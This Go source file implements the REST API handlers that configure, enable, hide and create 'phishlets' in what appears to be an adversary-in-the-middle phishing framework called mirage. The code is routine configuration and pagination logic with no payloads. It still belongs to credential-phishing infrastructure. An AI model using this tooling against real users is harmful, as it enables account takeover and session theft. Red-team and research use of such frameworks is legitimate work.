package api

import (
	"encoding/json"
	"errors"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listPhishlets(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)

	cfgs, err := r.phishlets.ListPhishletConfigs()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to list phishlets")
		return
	}

	total := len(cfgs)
	start := min(offset, total)
	end := min(start+limit, total)
	page := cfgs[start:end]

	items := make([]sdk.PhishletResponse, len(page))
	for i, cfg := range page {
		items[i] = phishletConfigToResponse(cfg)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.PhishletResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) enablePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")

	var body sdk.EnablePhishletRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body")
		return
	}

	cfg, err := r.phishlets.GetPhishletConfig(name)
	if err != nil {
		// No existing config — create a new one.
		cfg = &aitm.PhishletConfig{Name: name}
	}
	if body.Hostname != "" {
		cfg.Hostname = body.Hostname
	}
	if body.BaseDomain != "" {
		cfg.BaseDomain = body.BaseDomain
	}
	if body.DNSProvider != "" {
		cfg.DNSProvider = body.DNSProvider
	}
	if cfg.Hostname == "" {
		writeError(w, http.StatusUnprocessableEntity, "hostname: required")
		return
	}

	cfg.Enabled = true
	if err := r.phishlets.SetPhishletConfig(cfg); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to enable phishlet")
		return
	}
	writeJSON(w, http.StatusOK, phishletConfigToResponse(cfg))
}

func (r *Router) disablePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	cfg, err := r.phishlets.GetPhishletConfig(name)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get phishlet")
		}
		return
	}
	cfg.Enabled = false
	if err := r.phishlets.SetPhishletConfig(cfg); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to disable phishlet")
		return
	}
	writeJSON(w, http.StatusOK, phishletConfigToResponse(cfg))
}

func (r *Router) hidePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	cfg, err := r.phishlets.GetPhishletConfig(name)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get phishlet")
		}
		return
	}
	cfg.Hidden = true
	if err := r.phishlets.SetPhishletConfig(cfg); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to hide phishlet")
		return
	}
	writeJSON(w, http.StatusOK, phishletConfigToResponse(cfg))
}

func (r *Router) unhidePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	cfg, err := r.phishlets.GetPhishletConfig(name)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get phishlet")
		}
		return
	}
	cfg.Hidden = false
	if err := r.phishlets.SetPhishletConfig(cfg); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to unhide phishlet")
		return
	}
	writeJSON(w, http.StatusOK, phishletConfigToResponse(cfg))
}

func (r *Router) createSubPhishlet(w http.ResponseWriter, req *http.Request) {
	body, ok := decodeAndValidate[sdk.CreateSubPhishletRequest](w, req)
	if !ok {
		return
	}

	sp := &aitm.SubPhishlet{
		Name:       body.Name,
		ParentName: body.ParentName,
		Params:     body.Params,
	}
	if err := r.phishlets.CreateSubPhishlet(sp); err != nil {
		if errors.Is(err, aitm.ErrConflict) {
			writeError(w, http.StatusConflict, "phishlet already exists")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to create phishlet")
		}
		return
	}
	writeJSON(w, http.StatusCreated, sdk.PhishletResponse{
		Name:       sp.Name,
		ParentName: sp.ParentName,
	})
}

func (r *Router) deleteSubPhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	if err := r.phishlets.DeleteSubPhishlet(name); err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to delete phishlet")
		}
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// listRegistry stubs the phishlet registry — not implemented until Phase 15.
func (r *Router) listRegistry(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.PhishletResponse]{
		Items:  []sdk.PhishletResponse{},
		Total:  0,
		Limit:  limit,
		Offset: offset,
	})
}

// getPhishletHosts returns /etc/hosts lines for a phishlet. Stubbed until
// the PhishletResolver is wired into the Router.
func (r *Router) getPhishletHosts(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
}

func phishletConfigToResponse(cfg *aitm.PhishletConfig) sdk.PhishletResponse {
	return sdk.PhishletResponse{
		Name:        cfg.Name,
		BaseDomain:  cfg.BaseDomain,
		Hostname:    cfg.Hostname,
		DNSProvider: cfg.DNSProvider,
		UnauthURL:   cfg.UnauthURL,
		SpoofURL:    cfg.SpoofURL,
		Enabled:     cfg.Enabled,
		Hidden:      cfg.Hidden,
	}
}
